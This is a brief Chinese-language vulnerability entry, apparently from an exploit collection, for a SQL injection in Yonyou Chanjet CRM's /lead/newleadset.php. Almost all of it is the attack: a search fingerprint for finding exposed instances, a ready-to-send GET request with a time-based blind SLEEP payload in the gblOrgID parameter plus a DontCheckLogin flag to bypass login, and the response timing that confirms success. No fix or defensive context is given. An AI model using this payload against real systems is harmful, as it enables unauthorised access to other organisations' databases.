# 用友畅捷通CRMnewleadsetSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="畅捷CRM"`
- **请求**：`GET /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(3)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1`
- **响应特征**：200 响应时间>=3s